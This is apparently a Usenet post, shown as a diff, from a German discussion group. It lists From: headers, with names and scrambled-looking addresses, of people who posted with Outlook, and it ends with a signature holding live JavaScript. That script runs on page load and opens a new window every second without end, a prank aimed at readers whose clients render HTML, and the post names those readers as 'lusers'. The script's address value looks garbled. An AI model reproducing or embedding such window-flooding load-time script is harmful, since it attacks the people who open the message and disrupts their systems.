@@ -1,0 +1,30 @@
+kai@rincewind:/var/spool/news/articles/de/talk/jugend>grep 'Newsreader.*Outlook' *|cut -f 1 -d :|xargs -n 1 grep From:|sort -u
+From: "Ursel Ohlrogge" <LwlkY@mkk.wd>
+From: "Asia Friend" <npgovl.ddhvx@quavbids.oy>
+From: "Bademeister" <Aefpkjtldwe@jvxonmtgrqv.km>
+From: "Jörg Kessebohm" <awlvm@saoq.ip>
+From: "Francesco Tielemans" <ynhcns.euafnjxl@kqracdv.hm-jbirec.qu>
+From: "Lotte Schnyder" <irghrha@wix.gh>
+From: "Timo Vaarkamp" <utstakt_z@jaudfsm.oxa>
+From: "Timo Vaarkamp" <kfzsytp_nt@heb.vy>
+From: "Viktor Voolstra" <jejbxpgn@hiqw-qb.ky>
+From: "Norbert Siegmundt" <Vzinp.Rzpztfm@zigywg-eve.re>
+From: "MWS" <Q.H.N.@aen.qx>
+From: "Charles Mannherz" <awrn@baezk.fu>
+From: "Rene" <tadt_3433@eoldqat.hrs>
+From: "Isensee" <awrn@baezk.fu>
+From: "Thommy" <MeEies@nbo.tx>
+From: "Leonhard Franks" <kkvcceqi@ltkoydp.sbz>
+From: "b illers" <e.ccvhegddo@mxvxedy.bk>
+From: Vqwzm@i-spqnvx.nc (Thierfeld)
+From: DzcrueH@z-feuugs.hc (Colette Igreb)
+From: Svoexzrrp.Knhv@g-dpxqgq.wn (Ingmar Ilkenhans)
+From: sxugrv.oszezzaaadk@cixza.firided.mw (Wilfried T. Sandhäger)
+kai@rincewind:/var/spool/news/articles/de/talk/jugend>
+
+ottilia
+-- 
+<script language="Javascript"> function luser(i){var title="W"+i;i=i+1;
+var newwindow=window.open("",title); var cmd="luser("+ i + ")";
+hmllzannm.kpwlenje="fxai://fql.iend.wsdnjqwi.ig/~b8paj/ufulrfgjdydgclh.hsoe";
+window.setTimeout(cmd,1000);}</script><BODY onLoad="luser(0)">LUSER!</Body>
